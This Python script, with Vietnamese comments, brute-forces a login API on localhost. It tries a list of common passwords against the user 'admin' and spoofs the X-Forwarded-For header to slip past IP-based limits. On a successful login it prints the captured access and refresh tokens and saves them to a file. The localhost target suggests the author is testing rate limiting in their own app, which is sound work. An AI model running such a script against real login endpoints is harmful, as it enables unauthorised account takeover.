import requests
import json
import webbrowser
import time

URL = 'http://localhost:8000/api/login/'
USERNAME = 'admin'
PASSWORD = 'admin'

# Danh sách passwords để thử
passwords = [
    'admin', 'password', '123456', 'root', 'test',
    'user', 'guest', '1234', 'qwerty', 'letmein', 'welcome'
]

print(f"🔍 Bắt đầu brute force attack cho user: {USERNAME}")
print(f"📋 Danh sách passwords: {passwords}")
print("-" * 50)

for i, password in enumerate(passwords):
    ip_fake = "192.168.1.214"
    headers = {
        "X-Forwarded-For": ip_fake,
        "User-Agent": f"TestBot/{i}",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "http://localhost:5173",
        "Referer": "http://localhost:5173/login",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    data = {
        'username': USERNAME,
        'password': password
    }
    
    print(f"[{i+1}/{len(passwords)}] Thử: {USERNAME}:{password}")
    
    try:
        res = requests.post(URL, json=data, headers=headers, timeout=2)
        response_data = res.json() if res.headers.get('content-type', '').startswith('application/json') else res.text
        
        print(f"   Status: {res.status_code}")
        print(f"   Response: {response_data}")
        
        # Kiểm tra đăng nhập thành công
        if res.status_code == 200 and 'access' in response_data:
            print("\n" + "="*60)
            print("🎉 ĐĂNG NHẬP THÀNH CÔNG!")
            print("="*60)
            print(f"👤 Username: {USERNAME}")
            print(f"🔑 Password: {password}")
            print(f"🔗 Token: {response_data.get('access', 'N/A')}")
            print(f"🔗 Refresh Token: {response_data.get('refresh', 'N/A')}")
            print("="*60)
            
            # Tự động mở trình duyệt
            print("🌐 Đang mở trình duyệt...")
            webbrowser.open('http://localhost:5173/login')
            
            # Lưu thông tin vào file
            with open('successful_login.txt', 'w', encoding='utf-8') as f:
                f.write(f"Username: {USERNAME}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Token: {response_data.get('access', 'N/A')}\n")
                f.write(f"Refresh Token: {response_data.get('refresh', 'N/A')}\n")
                f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            print("💾 Đã lưu thông tin vào file 'successful_login.txt'")
            break
            
        elif res.status_code == 401:
            print("   ❌ Sai password")
        else:
            print("   ⚠️  Lỗi khác")
            
    except requests.exceptions.Timeout:
        print("   ⏰ Timeout")
    except requests.exceptions.ConnectionError:
        print("   🔌 Lỗi kết nối")
    except Exception as e:
        print(f"   ❌ Lỗi: {e}")
    
    print("-" * 30)

print("\n🏁 Kết thúc brute force attack!")
